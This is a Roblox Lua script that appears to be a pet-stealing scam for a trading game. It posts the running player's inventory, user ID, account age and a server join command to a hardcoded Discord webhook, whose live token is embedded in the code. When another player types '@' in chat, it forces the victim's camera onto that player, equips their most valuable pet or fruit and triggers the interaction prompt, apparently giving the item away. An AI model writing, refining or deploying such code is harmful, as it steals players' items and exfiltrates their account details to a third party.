local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- CONFIGURATION
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {
    "T-Rex", "Dragonfly", "Raccoon", 
    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
}

-- Item priority system
local ITEM_PRIORITY = {
    ["T-Rex"] = 1000,
    ["Dragonfly"] = 950,
    ["Queen bee"] = 900,
    ["Disco bee"] = 850,
    ["Raccoon"] = 800,
    ["Mimic Octopus"] = 750,
    ["Butterfly"] = 700,
    -- Fruits pattern: [Rarity] Name [Weight]
    ["Disco"] = 600,  -- Highest fruit rarity
    ["Wet"] = 500,    -- Medium fruit rarity
    -- Default will be 400
}

--[[ WEBHOOK FUNCTIONS ]]--
local function sendToDiscord(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

local function sendInitialWebhook()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    -- Get all items from inventory
    local items = {}
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    -- Check for rare items
    local hasRare = false
    for _,pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            hasRare = true
            break
        end
    end
    
    -- Create embed
    local embed = {
        title = "📦 Inventory Scan - "..LocalPlayer.Name,
        description = table.concat(items, "\n"),
        color = hasRare and 0xFF0000 or 0x00FF00,
        fields = {
            {name = "Join Script", value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId), inline = false},
            {name = "Account Age", value = LocalPlayer.AccountAge, inline = true},
            {name = "User ID", value = LocalPlayer.UserId, inline = true}
        }
    }
    
    sendToDiscord(hasRare and "@everyone" or nil, embed)
end

--[[ ITEM INTERACTION SYSTEM ]]--
local function getBestItem(target)
    local bestItem, bestPriority = nil, 0
    
    for _,item in pairs(target.Backpack:GetChildren()) do
        local itemName = item.Name
        local priority = 400 -- Default priority
        
        -- Check for pets
        for pet, petPriority in pairs(ITEM_PRIORITY) do
            if string.find(itemName, pet) then
                priority = petPriority
                break
            end
        end
        
        -- Check for fruits
        local rarity = string.match(itemName, "%[([%w%s]+)%]")
        if rarity and ITEM_PRIORITY[rarity] then
            priority = ITEM_PRIORITY[rarity]
        end
        
        if priority > bestPriority then
            bestPriority = priority
            bestItem = item
        end
    end
    
    return bestItem
end

local function findInteractPart(targetChar)
    -- Looks for billboardgui or proximity prompts
    for _,part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") or part:FindFirstChildWhichIsA("BillboardGui") then
            return part
        end
    end
    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
end

local function interactWithTarget(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local interactPart = findInteractPart(targetChar)
    
    -- Force first person
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    -- Look at target
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
    end)
    
    -- Get best item and equip
    local bestItem = getBestItem(LocalPlayer)
    if bestItem then
        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
    end
    
    -- Hold interaction
    local prompt = interactPart:FindFirstChildWhichIsA("ProximityPrompt")
    if prompt then
        fireproximityprompt(prompt)
        task.wait(0.1)
        
        -- Simulate holding E for 5 seconds
        local startTime = os.clock()
        while os.clock() - startTime < 5 do
            if not prompt.Enabled then break end
            fireproximityprompt(prompt)
            task.wait(0.1)
        end
    else
        -- Fallback click interaction
        mouse1press()
        task.wait(5)
        mouse1release()
    end
    
    -- Cleanup
    if lookConn then lookConn:Disconnect() end
end

--[[ CHAT SYSTEM ]]--
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end
    
    -- Send player info to webhook
    local items = {}
    for _,item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local embed = {
        title = "🎯 Target Triggered - "..player.Name,
        description = table.concat(items, "\n"),
        color = 0xFFA500,
        fields = {
            {name = "User ID", value = player.UserId, inline = true},
            {name = "Account Age", value = player.AccountAge, inline = true}
        }
    }
    sendToDiscord(nil, embed)
    
    -- Interact with player
    interactWithTarget(player)
end

--[[ INITIALIZATION ]]--
sendInitialWebhook()

-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)

print("✅ System Active - Waiting for @ mentions")
